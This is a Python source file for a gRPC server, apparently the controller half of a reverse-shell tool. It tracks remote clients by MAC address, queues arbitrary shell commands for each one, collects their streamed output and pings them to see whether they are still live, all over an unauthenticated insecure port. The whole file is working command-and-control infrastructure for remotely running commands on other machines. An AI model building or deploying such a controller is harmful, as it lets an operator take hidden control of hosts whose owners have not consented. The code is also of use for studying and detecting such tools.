import grpc
import asyncio
from concurrent import futures
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import logging
import time
import threading

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ReverseShellService(reverse_shell_pb2_grpc.ReverseShellServiceServicer):
    def __init__(self):
        self.clients = {}  # Key: mac_address, Value: ClientInfo
        self.command_queues = {}  # Key: mac_address, Value: asyncio.Queue
        self.responses = {}  # Key: request_id, Value: CommandResponse
        self.pending_requests = {}  # Key: request_id, Value: mac_address
        self.lock = asyncio.Lock()
        self.ping_interval = 60  # Ping interval in seconds

        # Start the ping thread
        self.ping_thread = threading.Thread(target=self.ping_clients, daemon=True)
        self.ping_thread.start()

    async def StartSession(self, request, context):
        mac_address = request.mac_address
        logger.info(f"Client with MAC address {mac_address} connected.")
        if mac_address not in self.clients:
            self.clients[mac_address] = {
                'status': True,
                'last_pong': time.time()
            }
            self.command_queues[mac_address] = asyncio.Queue()

        try:
            while True:
                try:
                    command = await asyncio.wait_for(self.command_queues[mac_address].get(), timeout=1)
                    logger.info(f"Sending command to {mac_address}: {command.command}")
                    yield reverse_shell_pb2.CommandRequest(
                        request_id=command.request_id,
                        command=command.command,
                        macAddress=mac_address
                    )
                except asyncio.TimeoutError:
                    await asyncio.sleep(0.1)
        except asyncio.CancelledError:
            logger.info(f"Client {mac_address} disconnected from StartSession.")
        finally:
            self.clients.pop(mac_address, None)
            self.command_queues.pop(mac_address, None)

    async def StreamResponses(self, request_iterator, context):
        async for request in request_iterator:
            request_id = request.request_id
            output = request.output
            is_active = request.is_active
            mac_address = request.macAddress

            async with self.lock:
                if request_id not in self.responses:
                    self.responses[request_id] = reverse_shell_pb2.CommandResponse(
                        request_id=request_id,
                        output='',
                        is_active=is_active,
                        macAddress=mac_address
                    )
                self.responses[request_id].output += output + '\n'
                self.responses[request_id].is_active = is_active
                self.responses[request_id].macAddress = mac_address
                if not is_active:
                    logging.info(f"Command with request ID {request_id} finished.")
                    break  # Stop receiving if the command is finished
        return reverse_shell_pb2.CommandResponse()

    async def AddCommand(self, request, context):
        request_id = request.request_id
        command = request.command
        mac_address = request.macAddress

        if mac_address not in self.clients:
            logger.warning(f"Attempted to add command for unknown MAC address: {mac_address}")
            return reverse_shell_pb2.Empty()

        await self.command_queues[mac_address].put(request)
        logger.info(f"Added command to queue for {mac_address}: {command}, Request ID: {request_id}")

        # async with self.lock:
        #     self.responses[request_id] = None
        #     self.pending_requests[request_id] = mac_address

        return reverse_shell_pb2.Empty()

    async def GetResponse(self, request, context):
        """Retrieve the accumulated response for a specific request ID."""
            
        while True:
            response = self.responses.get(request.request_id)
            if response:
                print(response.output)
                yield reverse_shell_pb2.CommandResponse(
                    request_id=response.request_id,
                    output=response.output,
                    is_active=response.is_active,
                    macAddress=response.macAddress
                )
                self.responses[request.request_id].output = ''
                if not response.is_active:
                    break
            await asyncio.sleep(1)

    def ping_clients(self):
        asyncio.run(self._ping_clients())

    async def _ping_clients(self):
        while True:
            for mac_address in list(self.clients.keys()):
                await self.send_ping(mac_address)
            await asyncio.sleep(self.ping_interval)

    async def send_ping(self, mac_address):
        request_id = f"ping-{mac_address}-{int(time.time())}"
        ping_command = reverse_shell_pb2.CommandRequest(
            request_id=request_id,
            command="ping",
            macAddress=mac_address
        )
        await self.command_queues[mac_address].put(ping_command)
        logger.info(f"Sent ping to {mac_address} with Request ID: {request_id}")

        # Wait for pong response
        await asyncio.sleep(10)  # Wait for pong within 10 seconds

        async with self.lock:
            response = self.responses.pop(request_id, None)
            if response and "pong" in response.output.lower():
                self.clients[mac_address]['status'] = True
                self.clients[mac_address]['last_pong'] = time.time()
                logger.info(f"Received pong from {mac_address}")
            else:
                self.clients[mac_address]['status'] = False
                logger.warning(f"No pong received from {mac_address}")




# async def command_interface(reverse_shell_service):
#     def handle_stop_signal(signum, frame):
#         nonlocal stop_command
#         stop_command = True
#         logging.info("Received stop signal (Ctrl+C). Stopping the current command...")

#     signal.signal(signal.SIGINT, handle_stop_signal)

#     while True:
#         stop_command = False
#         command = input("Enter a command to execute: ")
#         if command.strip():
#             request_id = f"command-{hash(command + str(time.time()))}"

#             await reverse_shell_service.add_command_to_queue(command, request_id)

#             while True:
#                 if stop_command:
#                     # Clear the queue before adding the "STOP" command
#                     while not reverse_shell_service.client_queue.empty():
#                         discarded_command = await reverse_shell_service.client_queue.get()
#                         logging.info(f"Clearing command from queue: {discarded_command}")

#                     # Now add the "STOP" command
#                     await reverse_shell_service.add_command_to_queue("STOP", request_id)
#                     logging.info("Added 'STOP' command to queue")
#                     break
                
#                 if request_id in reverse_shell_service.responses:
#                     response = reverse_shell_service.responses[request_id]
#                     if not response.is_active:
#                         reverse_shell_service.responses.pop(request_id, None)
#                         break
#                 await asyncio.sleep(1)
#         else:
#             logging.info("No command entered, skipping.")

# async def serve():
#     server = grpc.aio.server(futures.ThreadPoolExecutor(max_workers=10))
#     reverse_shell_service = ReverseShellService()
#     reverse_shell_pb2_grpc.add_ReverseShellServiceServicer_to_server(reverse_shell_service, server)
#     server.add_insecure_port('[::]:50051')
#     logging.info("gRPC server is starting...")

#     await server.start()
    
#     # await asyncio.gather(
#     #     command_interface(reverse_shell_service),
#     #     server.wait_for_termination()
#     # )
#     await server.wait_for_termination()
# if __name__ == "__main__":
#     asyncio.run(serve())

async def serve():
    server = grpc.aio.server(futures.ThreadPoolExecutor(max_workers=100))
    reverse_shell_service = ReverseShellService()
    reverse_shell_pb2_grpc.add_ReverseShellServiceServicer_to_server(reverse_shell_service, server)
    server.add_insecure_port('[::]:50051')  # Use a different port to avoid conflict with command service
    logger.info("Reverse Shell gRPC Server starting on port 50051...")
    await server.start()
    await server.wait_for_termination()

if __name__ == "__main__":
    asyncio.run(serve())
